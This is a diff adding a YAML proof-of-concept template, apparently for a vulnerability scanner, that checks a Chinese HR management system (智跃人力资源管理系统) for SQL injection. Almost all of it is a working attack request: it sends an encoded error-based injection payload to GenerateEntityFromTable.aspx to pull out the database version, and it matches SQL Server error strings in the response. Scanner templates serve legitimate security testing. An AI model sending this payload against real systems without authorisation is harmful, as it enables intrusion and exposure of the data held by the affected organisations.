@@ -1,0 +1,21 @@
+id: poc-yaml-zhi-yue-ren-li-guan-li-xi-tong-generateentityfromTable.aspx-sqli
+info:
+  name: 智跃人力资源管理系统GenerateEntityFromTable.aspx SQL注入
+  severity: high
+  tags:
+  - sql-injection
+  finger: 智跃人力资源管理系统
+requests:
+- method: GET
+  path: /resource/utils/GenerateEntityFromTable.aspx?t=1%27%2B(SELECT%20CHAR(103)%2BCHAR(87)%2BCHAR(114)%2BCHAR(112)%20WHERE%201669%3D1669%20AND%206492%20IN%20(select+@@version))%2B%27
+  expression: 'status_code == 500 &&
+
+    contains(body,"nvarchar") &&
+
+    contains(body,"System.Data.SqlClient") &&
+
+    contains(body,"Microsoft SQL Server")
+
+    '
+variables: {}
+transport: http
